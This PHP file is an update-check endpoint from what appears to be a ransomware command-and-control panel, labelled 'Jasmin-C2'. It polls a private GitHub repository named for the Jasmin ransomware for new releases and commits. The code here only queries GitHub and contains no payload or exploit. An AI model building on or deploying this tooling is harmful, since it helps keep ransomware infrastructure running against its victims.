<?php
/**
 * 检查更新API — 从GitHub私有仓库检查最新版本
 */
require_once __DIR__ . '/includes/auth.php';
require_auth();

header('Content-Type: application/json');

// 版本号写在这里，每次发版更新
define('CURRENT_VERSION', '1.0.0');

$action = $_GET['action'] ?? 'check';

if ($action === 'check') {
    check_update();
} elseif ($action === 'download') {
    download_update();
} else {
    echo json_encode(['ok'=>false,'msg'=>'Invalid action']);
}

function check_update() {
    $repo = 'https://api.github.com/repos/2016xyz/Jasmin-Ransomware-Private/releases/latest';
    $ctx = stream_context_create(['http'=>[
        'header'=>"User-Agent: Jasmin-C2\r\n",
        'timeout'=>10
    ]]);
    $json = @file_get_contents($repo, false, $ctx);
    if (!$json) {
        // fallback: 检查commits
        $commits_url = 'https://api.github.com/repos/2016xyz/Jasmin-Ransomware-Private/commits?per_page=1';
        $json = @file_get_contents($commits_url, false, $ctx);
        if (!$json) {
            echo json_encode(['ok'=>true,'current'=>CURRENT_VERSION,'latest'=>CURRENT_VERSION,'update'=>false,'msg'=>'无法连接更新服务器']);
            return;
        }
        $data = json_decode($json, true);
        $sha = substr($data[0]['sha'] ?? '', 0, 7);
        $date = $data[0]['commit']['committer']['date'] ?? '';
        $msg = $data[0]['commit']['message'] ?? '';
        echo json_encode(['ok'=>true,'current'=>CURRENT_VERSION,'latest_commit'=>$sha,'date'=>$date,'message'=>$msg,'update'=>true]);
        return;
    }
    $data = json_decode($json, true);
    $latest = $data['tag_name'] ?? CURRENT_VERSION;
    $has_update = version_compare($latest, CURRENT_VERSION, '>');
    echo json_encode([
        'ok'=>true,'current'=>CURRENT_VERSION,'latest'=>$latest,
        'update'=>$has_update,'download_url'=>$data['zipball_url'] ?? '',
        'body'=>$data['body'] ?? '']);
}

function download_update() {
    echo json_encode(['ok'=>true,'msg'=>'请通过 git pull 或下载最新Release更新','repo'=>'https://github.com/2016xyz/Jasmin-Ransomware-Private']);
}
